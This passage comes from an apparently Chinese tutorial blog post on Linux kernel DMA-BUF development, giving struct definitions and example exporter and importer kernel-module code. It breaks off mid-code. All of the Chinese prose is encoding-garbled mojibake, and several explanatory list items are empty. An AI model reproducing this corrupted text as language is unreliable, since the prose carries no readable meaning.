æ˜¯ä¸€ä¸ªé‡è¦çš„ç»“æ„ä½“ï¼Œå…¶ç”¨äºè¡¨ç¤ºä¸€ä¸ªå…±äº«å†…å­˜å¯¹è±¡ï¼ŒåŒ…æ‹¬å†…å­˜å¤§å°ã€ç»‘å®šçš„æ–‡ä»¶æè¿°ç¬¦ç­‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> &#123;</span><br><span class="hljs-type">size_t</span> size;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">attachments</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> vmapping_counter;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iosys_map</span> <span class="hljs-title">vmap_ptr</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *exp_name;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br><span class="hljs-type">spinlock_t</span> name_lock;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">owner</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DEBUG_FS)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list_node</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">void</span> *priv;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_resv</span> *<span class="hljs-title">resv</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> poll;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_poll_cb_t</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_fence_cb</span> <span class="hljs-title">cb</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> *poll;<br><br><span class="hljs-type">__poll_t</span> active;<br>&#125; cb_in, cb_out;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DMABUF_SYSFS_STATS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_sysfs_entry</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">dmabuf</span>;</span><br>&#125; *sysfs_entry;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>æ¯”è¾ƒå…³é”®çš„å­—æ®µå¦‚ä¸‹ï¼š</p><ul><li><p><code>size</code> ï¼šå…±äº«å†…å­˜çš„å¤§å°ï¼Œåœ¨ dmabuf çš„ç”Ÿå‘½å‘¨æœŸä¸­ä¸ä¼šå‘ç”Ÿæ”¹å˜</p></li><li><p><code>file</code> ï¼š ä¸ dmabuf ç›¸å…³è”çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä¾›ç”¨æˆ·æ€æ“ä½œ</p></li><li><p><code>attachments</code> ï¼š</p></li><li><p><code>ops</code> ï¼šdmabuf æ“ä½œå‡½æ•°è¡¨</p></li><li><p><code>priv</code> ï¼šå³ privateï¼Œç§æœ‰å­—æ®µï¼Œä½ å¯ä»¥åœ¨å…¶ä¸­æŒ‰éœ€å­˜æ”¾æ•°æ®</p></li></ul><p>å¯¹äº exporter ä¾§è€Œè¨€ï¼Œå…¶éœ€è¦æ ¹æ®éœ€æ±‚è‡ªè¡Œå®ç° <code>struct dma_buf_ops</code> å½“ä¸­çš„ç›¸åº”æ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> &#123;</span><br><span class="hljs-type">int</span> (*attach)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">struct</span> dma_buf_attachment *);<br><span class="hljs-type">void</span> (*detach)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">struct</span> dma_buf_attachment *);<br><span class="hljs-type">int</span> (*pin)(<span class="hljs-keyword">struct</span> dma_buf_attachment *attach);<br><span class="hljs-type">void</span> (*unpin)(<span class="hljs-keyword">struct</span> dma_buf_attachment *attach);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> * (*<span class="hljs-title">map_dma_buf</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_attachment</span> *,</span><br><span class="hljs-class"> <span class="hljs-title">enum</span> <span class="hljs-title">dma_data_direction</span>);</span><br><span class="hljs-type">void</span> (*unmap_dma_buf)(<span class="hljs-keyword">struct</span> dma_buf_attachment *,<br>      <span class="hljs-keyword">struct</span> sg_table *,<br>      <span class="hljs-keyword">enum</span> dma_data_direction);<br><span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> dma_buf *);<br><span class="hljs-type">int</span> (*begin_cpu_access)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">enum</span> dma_data_direction);<br><span class="hljs-type">int</span> (*end_cpu_access)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">enum</span> dma_data_direction);<br><span class="hljs-type">int</span> (*mmap)(<span class="hljs-keyword">struct</span> dma_buf *, <span class="hljs-keyword">struct</span> vm_area_struct *vma);<br><span class="hljs-type">int</span> (*vmap)(<span class="hljs-keyword">struct</span> dma_buf *dmabuf, <span class="hljs-keyword">struct</span> iosys_map *<span class="hljs-built_in">map</span>);<br><span class="hljs-type">void</span> (*vunmap)(<span class="hljs-keyword">struct</span> dma_buf *dmabuf, <span class="hljs-keyword">struct</span> iosys_map *<span class="hljs-built_in">map</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ‰€æœ‰å¯ç”¨æ“ä½œåŒ…æ‹¬ï¼š</p><ul><li><code>attach</code> ï¼šç”¨äºå»ºç«‹ dma-buf ä¸è®¾å¤‡é—´çš„è¿æ¥å…³ç³»ï¼Œå¹¶å­˜æ”¾ä¸­æ–°åˆ›å»ºçš„ <code>struct dma_buf_attachment</code> å¯¹è±¡ä¸­</li><li><code>detach</code> ï¼š</li><li><code>pin</code> ï¼š</li><li><code>unpin</code> ï¼š</li><li><code>map_dma_buf</code> ï¼š</li><li><code>unmap_dma_buf</code> ï¼š</li><li><code>release</code> ï¼š</li><li><code>begin_cpu_access</code> ï¼š</li><li><code>end_cpu_access</code> ï¼š</li><li><code>mmap</code> ï¼š</li><li><code>vmap</code> ï¼š</li><li><code>vunmap</code> ï¼š</li></ul><h1 id="0x02-ç®€æ˜“-DMA-BUF-å¼€å‘"><a href="#0x02-ç®€æ˜“-DMA-BUF-å¼€å‘" class="headerlink" title="0x02. ç®€æ˜“ DMA-BUF å¼€å‘"></a>0x02. ç®€æ˜“ DMA-BUF å¼€å‘</h1><p>å‰é¢è®²åˆ° dmabuf çš„åŸºæœ¬æ“ä½œåºåˆ—å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬åç»­å°†ä»¥æ­¤ä¸ºç¤ºä¾‹è¿›è¡Œå¼€å‘</p><p><img src="https://s2.loli.net/2024/10/08/li3mnaFSkyrcpOW.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ DMA-BUF ç›¸å…³å‡½æ•°åœ¨ <code>DMA_BUF</code> å‘½åç©ºé—´ä¸­ï¼Œæˆ‘ä»¬åº”å½“åœ¨å†…æ ¸æ¨¡å—ä»£ç ä¸­è¿›è¡Œå¯¼å…¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">MODULE_IMPORT_NS(DMA_BUF);<br></code></pre></td></tr></table></figure><h2 id="åŸºæœ¬çš„-exporter"><a href="#åŸºæœ¬çš„-exporter" class="headerlink" title="åŸºæœ¬çš„ exporter"></a>åŸºæœ¬çš„ exporter</h2><p>å¯¹äº exporter è€Œè¨€ï¼Œæœ€é‡è¦çš„æ˜¯å®ç° <code>struct dma_buf_ops</code> ä¸­ä¸å¯æˆ–ç¼ºçš„åŸºæœ¬æ“ä½œ</p><h3 id="map-dma-buf-ï¼šæ˜ å°„-dma-buf-å…±äº«å†…å­˜"><a href="#map-dma-buf-ï¼šæ˜ å°„-dma-buf-å…±äº«å†…å­˜" class="headerlink" title="map_dma_buf ï¼šæ˜ å°„ dma-buf å…±äº«å†…å­˜"></a><code>map_dma_buf</code> ï¼šæ˜ å°„ dma-buf å…±äº«å†…å­˜</h3><p>è¯¥å‡½æ•°æŒ‡é’ˆçš„ä½œç”¨ä¸»è¦æ˜¯å°† dma-buf çš„å…±äº«å†…å­˜è¿›è¡Œæ˜ å°„ï¼Œå¹¶å°†ç»“æœå†™åˆ°åˆ°ä¸€ä¸ª <code>sg_table</code> ç»“æ„å½“ä¸­ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬å‡å®šåœ¨æ­¤ <code>dma_buf</code> ä¸­å·²ç»é€šè¿‡ <code>kmalloc()</code> åˆ†é…äº†å†…å­˜å¹¶å­˜æ”¾åˆ° <code>dma_buf::priv</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> sg_table*<br><span class="hljs-title function_">a3exporter_map_dma_buf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf_attachment *attachment,</span><br><span class="hljs-params">                       <span class="hljs-keyword">enum</span> dma_data_direction direction)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sg_table</span> *<span class="hljs-title">table</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">buf</span>;</span><br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">void</span> *err;<br>    <br>    table = kzalloc(<span class="hljs-keyword">sizeof</span>(*table), GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!table) &#123;<br>        printk(KERN_ERR<br>               <span class="hljs-string">&quot;[a3exporter:] Failed to allocate memory for sg_table!\n&quot;</span>);<br>        err = ERR_PTR(-ENOMEM);<br>        <span class="hljs-keyword">goto</span> err_table_no_mem;<br>    &#125;<br><br>    ret = sg_alloc_table(table, <span class="hljs-number">1</span>, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (unlikely(ret)) &#123;    <span class="hljs-comment">/* table will be freed in this function if error */</span><br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Failed to allocate scatterlist!\n&quot;</span>);<br>        err = ERR_PTR(ret);<br>        <span class="hljs-keyword">goto</span> err_sg_alloc;<br>    &#125;<br><br>    buf = attachment-&gt;dmabuf;<br>    sg_dma_len(table-&gt;sgl) = buf-&gt;size;<br>    sg_dma_address(table-&gt;sgl) = dma_map_single(mdev, <span class="hljs-comment">/* cannot be NULL*/</span><br>                                                buf-&gt;priv,<br>                                                buf-&gt;size,<br>                                                direction);<br><br>    <span class="hljs-keyword">if</span> (dma_mapping_error(mdev, sg_dma_address(table-&gt;sgl))) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Unable to map for dmabuf!\n&quot;</span>);<br>        err = ERR_PTR(-EFAULT);<br>        <span class="hljs-keyword">goto</span> err_dma_map;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> table;<br><br>err_dma_map:<br>    sg_free_table(table);<br>err_sg_alloc:<br>    kfree(table);<br>err_table_no_mem:<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="unmap-dma-buf-ï¼š-è§£é™¤-dma-buf-å…±äº«å†…å­˜æ˜ å°„"><a href="#unmap-dma-buf-ï¼š-è§£é™¤-dma-buf-å…±äº«å†…å­˜æ˜ å°„" class="headerlink" title="unmap_dma_buf ï¼š è§£é™¤ dma-buf å…±äº«å†…å­˜æ˜ å°„"></a><code>unmap_dma_buf</code> ï¼š è§£é™¤ dma-buf å…±äº«å†…å­˜æ˜ å°„</h3><p>è¿™ä¸ªå‡½æ•°æŒ‡é’ˆçš„ä½œç”¨ä¸»è¦å°±æ˜¯å°† <code>sg_table</code> ç›¸å…³çš„å†…å­˜é‡Šæ”¾æ‰ï¼Œå¹¶è§£é™¤æ‰ dmabuf çš„å†…å­˜æ˜ å°„ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3exporter_unmap_dma_buf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf_attachment *attachment,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">struct</span> sg_table *table,</span><br><span class="hljs-params">                                     <span class="hljs-keyword">enum</span> dma_data_direction direction)</span><br>&#123;<br>    dma_unmap_single(mdev,<br>                     sg_dma_address(table-&gt;sgl),<br>                     sg_dma_len(table-&gt;sgl),<br>                     direction);<br>    sg_free_table(table);<br>    kfree(table);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="release-ï¼š-é‡Šæ”¾-dma-buf-çš„å†…å­˜"><a href="#release-ï¼š-é‡Šæ”¾-dma-buf-çš„å†…å­˜" class="headerlink" title="release ï¼š é‡Šæ”¾ dma-buf çš„å†…å­˜"></a><code>release</code> ï¼š é‡Šæ”¾ dma-buf çš„å†…å­˜</h3><p>è¯¥å‡½æ•°æŒ‡é’ˆçš„ä½œç”¨æ˜¯çœŸæ­£é‡Šæ”¾æ‰ dmabuf ä¸­çš„å†…å­˜ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œè¿™é‡Œæˆ‘ä»¬å‡å®šæˆ‘ä»¬çš„ dmabuf ä¸­çš„å†…å­˜æ˜¯é€šè¿‡ <code>kmalloc()</code> è¿›è¡Œåˆ†é…çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3exporter_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf *buf)</span><br>&#123;<br>    kfree(buf-&gt;priv);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å®šä¹‰-dma-buf"><a href="#å®šä¹‰-dma-buf" class="headerlink" title="å®šä¹‰ dma_buf"></a>å®šä¹‰ <code>dma_buf</code></h3><p>å®šä¹‰äº†ä¸Šé¢è¿™ä¸‰ä¸ªå‡½æ•°ä¹‹åï¼Œæˆ‘ä»¬çš„ <code>dma_buf</code> çš„åŸºæœ¬åŠŸèƒ½ç®—æ˜¯å®Œå¤‡äº†ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹è¿›è¡Œ <code>dma_buf</code> çš„åˆ†é…ä¸å¯¼å‡ºï¼Œè¿™é‡Œæˆ‘ä»¬ç»™å‡ºä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œåœ¨ exporter é©±åŠ¨çš„åˆå§‹åŒ–å‡½æ•°ä¸­åˆ†é…ä¸€å—å¸¸è§„çš„å†…å­˜å¹¶åŒ…è£…åˆ° <code>dma_buf</code> ä¸­ï¼Œä¸ºäº†ç®€åŒ–å¼€å‘æµç¨‹ä¸”æ–¹ä¾¿ importer é©±åŠ¨ä½¿ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥å°† <code>a3dmabuf</code> ä½œä¸ºä¸€ä¸ªç¬¦å·å¯¼å‡ºï¼š</p><blockquote><p>è¿™é‡Œæˆ‘ä»¬åœ¨ <code>a3exporter_create_dev()</code> ä¸­åˆ›å»ºäº†ä¸€ä¸ªç©ºç™½è®¾å¤‡èŠ‚ç‚¹ï¼Œä»…ç”¨ä½œ DMA å ä½ï¼Œå…¶å®ç°æ¯”è¾ƒç®€å•æ•…æ­¤å¤„ä¸å†ç»™å‡º</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">mdev</span>  =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> <span class="hljs-title">a3exporter_dmabuf_ops</span> =</span> &#123;<br>    .map_dma_buf    = a3exporter_map_dma_buf,<br>    .unmap_dma_buf  = a3exporter_unmap_dma_buf,<br>    .release        = a3exporter_buf_release,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">a3dmabuf</span> =</span> <span class="hljs-literal">NULL</span>;<br>EXPORT_SYMBOL(a3dmabuf);<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3exporter_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    DEFINE_DMA_BUF_EXPORT_INFO(exp_info);<br>    <span class="hljs-type">char</span> *buf;<br>    <span class="hljs-type">int</span> err;<br><br>    err = a3exporter_create_dev();<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Unable to create exporter device, &quot;</span><br>               <span class="hljs-string">&quot;error code: %d\n&quot;</span>, err);<br>        <span class="hljs-keyword">goto</span> err_dev;<br>    &#125;<br><br>    buf = kmalloc(PAGE_SIZE * <span class="hljs-number">8</span>, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!buf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Failed to allocate memory for buf!\n&quot;</span>);<br>        err = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> err_buf_no_mem;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        *(<span class="hljs-type">uint64_t</span>*) &amp;buf[PAGE_SIZE * i] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba0&quot;</span>;<br>        buf[PAGE_SIZE * i + <span class="hljs-number">7</span>] += i;<br>    &#125;<br><br>    exp_info.ops    = &amp;a3exporter_dmabuf_ops;<br>    exp_info.size   = PAGE_SIZE * <span class="hljs-number">8</span>;<br>    exp_info.priv   = buf;<br>    exp_info.flags  = O_RDWR | O_CLOEXEC;<br><br>    a3dmabuf = dma_buf_export(&amp;exp_info);<br>    <span class="hljs-keyword">if</span> (IS_ERR(a3dmabuf)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3exporter:] Failed to allocate dma_buf!\n&quot;</span>);<br>        err = PTR_ERR(a3dmabuf);<br>        <span class="hljs-keyword">goto</span> err_exp_info;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3exporter:] Module initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_exp_info:<br>    kfree(buf);<br>err_buf_no_mem:<br>err_dev:<br>    class_destroy(mclass);<br>    unregister_chrdev(major_num, DEVICE_NAME);<br>    <span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3exporter_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (a3dmabuf) &#123;<br>        dma_buf_put(a3dmabuf);<br>        a3dmabuf = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    class_destroy(mclass);<br>    unregister_chrdev(major_num, DEVICE_NAME);<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3exporter:] See you next time.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="importer-é©±åŠ¨ç®€å•ç¤ºä¾‹"><a href="#importer-é©±åŠ¨ç®€å•ç¤ºä¾‹" class="headerlink" title="importer é©±åŠ¨ç®€å•ç¤ºä¾‹"></a>importer é©±åŠ¨ç®€å•ç¤ºä¾‹</h2><p>æ¥ä¸‹æ¥ç¼–å†™æµ‹è¯•ç”¨çš„ importer é©±åŠ¨ï¼Œè¦åœ¨å†…æ ¸ç©ºé—´ä¸­ä½¿ç”¨ä¸€ä¸ª <code>dma_buf</code> ï¼Œæˆ‘ä»¬åªéœ€è¦å¦‚ä¸‹æ­¥éª¤ï¼š</p><ul><li>è·å– <code>dma_buf</code> å¹¶å¢åŠ å¼•ç”¨è®¡æ•°ï¼Œè¿™é‡Œæ³¨æ„ <code>dma_buf</code> çš„å¼•ç”¨è®¡æ•°æ˜¯é€šè¿‡æ–‡ä»¶æè¿°ç¬¦ <code>dma_buf::fd</code> è¿›è¡Œè®°å½•çš„</li><li>å°†æ‰€é€‰è®¾å¤‡èŠ‚ç‚¹ <code>struct device</code> ç»™ attach åˆ° <code>dma_buf</code> ä¸Š</li><li>è°ƒç”¨ <code>map_dma_buf()</code> è·å– <code>sg_table</code></li></ul><p>æ¥ä¸‹æ¥ç›´æ¥è®¿é—® <code>sg_table-&gt;scatterlist</code> å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œæ˜¯ä¸€ä¸ªç»™å¤–è®¾ä½¿ç”¨çš„ DMA åœ°å€ï¼Œè€Œæˆ‘ä»¬åªæ˜¯åœ¨å†…æ ¸ä¸­æµ‹è¯•ä½¿ç”¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å†è½¬å›å†…æ ¸è™šæ‹Ÿåœ°å€ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç®€æ˜“çš„ç¤ºä¾‹ importer ä»£ç æ ¸å¿ƒéƒ¨åˆ†ï¼š</p><blockquote><p>ä»¥åŠéœ€è¦æ³¨æ„çš„æ˜¯ DMA-BUF ä¾èµ–äºè®¾å¤‡èŠ‚ç‚¹ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>a3importer_create_dev()</code> åˆ›é€ ä¸€ä¸ªå ä½è®¾å¤‡ï¼Œä»£ç æ¯”è¾ƒç®€å•è¿™é‡Œä¸å†å±•å¼€</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/dma-buf.h&gt;</span></span><br><br>MODULE_IMPORT_NS(DMA_BUF);<br><br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">a3dmabuf</span>;</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">mdev</span>  =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3importer_import_dmabuf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_attachment</span> *<span class="hljs-title">attach</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">dma_data_direction</span> <span 